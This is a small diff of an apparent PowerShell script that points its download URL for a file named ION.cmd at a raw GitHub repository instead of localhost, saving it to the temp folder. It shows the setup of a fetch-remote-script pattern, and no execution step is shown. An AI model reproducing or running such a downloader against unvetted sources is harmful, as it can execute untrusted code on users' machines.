@@ -2,7 +2,7 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # Set the URL for the CMD file
-$cmdUrl = "http://localhost/ION.cmd"
+$cmdUrl = "https://github.com/nizhenets/test/raw/main/ION.cmd"
 
 # Define the temporary file path
 $tempPath = "$env:TEMP\ION.cmd"
